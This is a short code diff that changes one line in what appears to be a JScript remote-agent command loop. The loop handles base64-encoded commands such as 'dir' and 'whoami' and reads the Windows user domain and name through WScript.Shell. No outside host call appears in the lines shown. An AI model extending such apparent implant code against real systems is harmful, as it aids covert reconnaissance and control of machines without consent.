@@ -63,7 +63,7 @@ while (true) {
                   result = '"' + dir(b64d(args[0])) + '"';
               }
               if ('whoami' === name) {
-                  username = '"' + b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%")) + '"';
+                  username = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%"));
                   result = '["' + username + '","' + username + '"]';
               }
               if ('tmp' === name) {
